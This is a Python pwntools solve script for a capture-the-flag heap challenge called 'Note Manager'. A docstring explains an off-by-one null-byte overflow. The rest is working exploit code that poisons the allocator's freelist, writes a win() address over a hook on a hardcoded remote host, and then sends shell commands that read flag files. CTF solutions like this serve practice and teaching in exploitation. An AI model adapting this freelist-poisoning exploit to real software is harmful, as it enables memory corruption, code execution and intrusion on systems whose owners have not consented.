#!/usr/bin/env python3
"""
Solve script for the Note Manager pwn challenge (500pts)

Vulnerability: off-by-one null-byte overflow in the edit (append) function.
  - fill note0 with 31 bytes, then append 1 byte
  - strcat writes the byte at [31] and a null terminator at [32]
  - [32] is one past the 32-byte buffer → null byte spills into the
    16-byte chunk-header gap that sits between note0 and note1

Heap layout (offsets from the printed heap base):
  heap+0x00 : allocator state   (0x20 bytes)
  heap+0x20 : note0 data        (0x20 bytes)  ← note0 data ptr
  heap+0x40 : note1 chunk gap   (0x10 bytes)  ← null byte lands here
  heap+0x50 : note1 data        (0x20 bytes)  ← note1 data ptr / freelist next

Exploit steps:
  1. create note0 (32) filled with 31 'A's
  2. create note1 (32) filled with 31 'B's
  3. edit note0 with b'X'  → off-by-one null byte at heap+0x40
  4. delete note1           → freelist next-pointer written to note1.data[0..7] = heap+0x50 (NULL)
  5. edit note0 with 16 pad bytes + 3-byte hook address + explicit \x00
       fgets reads everything up to '\n'; strcat stops at the embedded \x00
       so '\n' never reaches the pointer → note1.data[0..2] = hook LSBs, [3] = \x00
       → freelist: note1 → hook
  6. create 32 bytes (dummy)  → pops note1; freelist head = hook
  7. create 32 bytes (p64(win)) → pops hook; writes win() at hook
  8. send '5' (exit)          → hook fires → win() prints the flag
"""

from pwn import *

HOST = '212.2.250.33'
PORT = 30170

context.log_level = 'info'

# ── connection ───────────────────────────────────────────────────────────────
r = remote(HOST, PORT)

r.recvuntil(b'heap @ ')
heap = int(r.recvline(), 16)
r.recvuntil(b'win()  @ ')
win  = int(r.recvline(), 16)
r.recvuntil(b'hook   @ ')
hook = int(r.recvline(), 16)

log.success(f'heap = {hex(heap)}')
log.success(f'win  = {hex(win)}')
log.success(f'hook = {hex(hook)}')

# ── helpers ──────────────────────────────────────────────────────────────────
def menu():
    r.recvuntil(b'> ')

def create(size, data):
    r.sendline(b'1')
    r.recvuntil(b'Size')
    r.sendline(str(size).encode())
    r.recvuntil(b'Content:')
    r.sendline(data)
    r.recvline()   # "Created note N at 0x… (size 0x…)"
    menu()

def create_raw(size, data):
    """Write binary data without letting '\n' pollute the note.

    fgets reads bytes until '\n' (inclusive) or n-1 chars.  By appending an
    explicit '\x00' before the newline we ensure strcat(note, buf) stops at
    the null and never copies the trailing newline into the note content.
    """
    r.sendline(b'1')
    r.recvuntil(b'Size')
    r.sendline(str(size).encode())
    r.recvuntil(b'Content:')
    r.send(data + b'\x00\n')
    r.recvline()
    menu()

def edit(idx, data):
    r.sendline(b'2')
    r.recvuntil(b'Index:')
    r.sendline(str(idx).encode())
    r.recvuntil(b'Append content:')
    r.sendline(data)
    menu()

def edit_raw(idx, data):
    """Same null-terminator trick as create_raw, for the append path."""
    r.sendline(b'2')
    r.recvuntil(b'Index:')
    r.sendline(str(idx).encode())
    r.recvuntil(b'Append content:')
    r.send(data + b'\x00\n')
    menu()

def delete(idx):
    r.sendline(b'3')
    r.recvuntil(b'Index:')
    r.sendline(str(idx).encode())
    menu()

# ── exploit ──────────────────────────────────────────────────────────────────
menu()

# Step 1-2: two full notes
create(32, b'A' * 31)   # note 0  (null at note0[31])
create(32, b'B' * 31)   # note 1

# Step 3: off-by-one without newline pollution.
# Use edit_raw so strcat only appends 'X' and places the new null at note0[32].
edit_raw(0, b'X')
log.info('off-by-one done — null byte at note0[32]')

# Step 4: free note 1 → freelist: [heap+0x50] → NULL
delete(1)
log.info('note 1 freed')

# Step 5: poison freelist
#   current null of note0 is at heap+0x40 (index 32 from note0 start)
#   note1.data[0]         is at heap+0x50
#   padding needed: 0x50 - 0x40 = 0x10 (16 bytes)
#
#   p64(hook)[:3] writes the hook's lower 3 bytes (current challenge addresses fit)
#   the explicit \x00 in edit_raw stops strcat before '\n' taints byte [3]
#   result: note1.data[0..3] = \x60\x42\x40\x00 → pointer = 0x00404260 = hook ✓
payload = b'P' * 16 + p64(hook)[:3]
edit_raw(0, payload)
log.info(f'freelist poisoned → note1.next = {hex(hook)}')

# Step 6: pop note1 → freelist head becomes hook
create(32, b'C' * 8)
log.info('consumed freed note 1 chunk')

# Step 7: pop hook → allocate at 0x404260, write win() there
create_raw(32, p64(win))
log.success(f'win() ({hex(win)}) written to hook @ {hex(hook)}')

# Step 8: trigger hook via exit (option 5)
log.info('triggering hook via exit…')
r.sendline(b'5')
try:
    # If win() drops us into a shell, proactively try common flag paths.
    cmd = (
        b'cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null || '
        b'cat flag 2>/dev/null || cat flag.txt 2>/dev/null'
    )
    r.sendline(cmd)
except EOFError:
    pass

r.interactive()
